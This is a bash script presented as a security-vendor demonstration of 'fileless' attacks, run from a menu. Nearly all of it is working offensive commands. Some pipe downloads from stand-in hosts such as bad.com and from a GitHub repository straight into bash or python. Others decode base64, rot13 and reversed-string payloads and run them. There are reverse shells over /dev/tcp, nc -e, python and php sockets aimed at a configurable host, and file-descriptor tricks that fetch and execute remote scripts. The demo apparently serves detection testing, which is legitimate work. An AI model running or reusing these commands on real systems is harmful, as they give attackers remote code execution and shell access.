#!/usr/bin/env bash
# ============================================================
#  fileless-execution-demo.sh
#  Purpose : Show 20 different fileless attacks (categorized)
#  Author  : Lior Boehm   –  Upwind Security demo
# ============================================================
set -euo pipefail

# Colors
BOLD="\e[1m"
CYAN="\e[36m"
GREEN="\e[32m"
YELLOW="\e[33m"
RESET="\e[0m"

# Banner
clear
command -v figlet >/dev/null && figlet "upwind.io" || echo -e "\nUPWIND.IO"
echo -e "${CYAN}${BOLD}Fileless Execution Demonstration  –  Lior Boehm${RESET}\n"

# Config
LHOST="127.0.0.1"
LPORT1="4444"
LPORT2="5555"
LPORT3="9001"

# Categorized commands
declare -A categories

categories[Downloaders]="
curl -s http://example.com/script.sh | bash
exec 3< <(curl -s http://bad.com/payload.sh); bash /proc/self/fd/3
X=\$(curl -s http://cryptojacker.org/liorpayload.py); python3 -c \"\$X\"
bash -c \"\$(curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/payload.sh)\"
"

categories[Encoding]="
echo 'ZXhlYyAiQjY0IHBheWxvYWQgc3VjY2VzcyIK' | base64 -d | bash
bash -c \"\$(curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/b64.txt | base64 -d)\"
bash -c \"\$(echo 'ENFUGBYY' | tr 'A-Za-z' 'N-ZA-Mn-za-m' | base64 -d)\"
exec 8< <(openssl enc -d -base64 <<< L2Jpbi9zaCAtYyBlY2hvIGhlbGxv); bash /proc/self/fd/8
"

categories[ReverseShells]="
timeout 2s bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT1} 0>&1' &
timeout 2s nc -e /bin/sh ${LHOST} ${LPORT1} &
timeout 2s python3 -c 'import os,pty,socket; s=socket.socket(); s.connect((\"${LHOST}\",${LPORT2})); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(\"/bin/sh\")' &
timeout 2s php -r '$s=fsockopen(\"${LHOST}\",7777);exec(\"/bin/sh -i <&3 >&3 2>&3\");' &
timeout 2s bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT3} 0>&1' &
"

categories[AdvancedFD]="
exec 3< <(echo 'hs.doaolyp/moc.dab//:ptth' | rev | xargs curl -s); bash /proc/self/fd/3
exec 3< /bin/bash; /proc/self/fd/3 -c 'echo executed FD shell'
exec {FD}<>/dev/tcp/${LHOST}/9898; echo whoami >&\$FD; cat <&\$FD &
exec 9< <(dd if=/dev/zero bs=0 count=0 | curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/shell.sh); bash /proc/self/fd/9
bash -c \"\$(python3 -c 'import urllib.request, base64; exec(base64.b64decode(urllib.request.urlopen(\"https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/b64.txt\").read()).decode())')\"
"

print_menu() {
  echo -e "${YELLOW}${BOLD}\n=========== MAIN MENU ===========${RESET}"
  echo "  1) Downloaders"
  echo "  2) Encoding"
  echo "  3) ReverseShells"
  echo "  4) AdvancedFD"
  echo "  a) Run ALL attacks"
  echo "  q) Quit"
}

run_category() {
  local cat=$1
  echo -e "\n${GREEN}[*] Running category: $cat${RESET}"
  local IFS=$'\n'
  local cmds=( $(echo -e "${categories[$cat]}" | sed '/^$/d') )
  for cmd in "${cmds[@]}"; do
    echo -e "\n${CYAN}[>] $cmd${RESET}"
    bash -c "$cmd" &
    sleep 1
  done
}

while true; do
  print_menu
  read -rp $'\nChoose category: ' choice
  case "$choice" in
    1) run_category Downloaders ;;
    2) run_category Encoding ;;
    3) run_category ReverseShells ;;
    4) run_category AdvancedFD ;;
    [Aa])
      for cat in "${!categories[@]}"; do
        run_category "$cat"
      done
      ;;
    [Qq]) echo -e "${BOLD}Exiting.${RESET}"; exit 0 ;;
    *) echo "Invalid choice" ;;
  esac
done
